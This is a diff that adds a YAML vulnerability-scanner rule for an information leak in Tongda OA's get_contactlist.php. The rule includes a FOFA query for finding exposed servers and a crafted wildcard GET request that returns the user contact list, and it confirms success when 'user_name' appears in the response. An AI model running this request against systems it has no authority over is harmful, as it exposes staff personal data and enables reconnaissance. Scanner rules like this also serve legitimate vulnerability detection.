@@ -1,0 +1,23 @@
+info:
+  vulId: tongda_infoleak_get_contactlist
+  detail: 通达OA get_contactlist.php信息泄露
+  fofaQuery: app="TDXK-通达OA"
+rules:
+  - request:
+      path: "{{rootUrl}}/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - user_name
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
